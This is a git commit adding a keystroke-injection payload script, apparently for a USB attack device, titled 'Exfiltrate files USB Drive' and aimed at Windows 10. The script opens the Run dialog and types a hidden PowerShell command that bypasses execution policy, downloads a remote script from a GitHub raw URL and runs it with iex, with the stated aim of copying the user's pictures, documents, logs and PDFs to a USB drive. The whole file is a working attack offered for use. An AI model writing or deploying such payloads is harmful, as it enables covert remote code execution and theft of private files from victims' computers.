25ba85ed492d47999cb1f40add8840159e2e70cb
egieb <93350544+beigeworm@users.noreply.github.com>
2023-12-29 22:27:03 +0000

    Add files via upload

---
+++ Fast-Execution/Exfiltrate-to-USB/Exfiltrate-to-USB.js
@@ -0,0 +1,15 @@
+// Title: beigeworm's Exfiltrate files USB Drive
+// Author: @beigeworm
+// Description: This script searches the users folder fot pictures, documents, logs, PDFs and more, then sends its all to newly connected USB drive.
+// Target: Windows 10
+
+// script setup
+layout("us")
+
+// Open Powershell and download script
+delay(1000);
+press("GUI r");
+delay(1000);
+type("powershell -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/beigeworm/PwnPi-Scripts/main/Fast-Execution/Exfiltrate-to-USB/main.ps1 | iex");
+delay(500);
+press("ENTER");
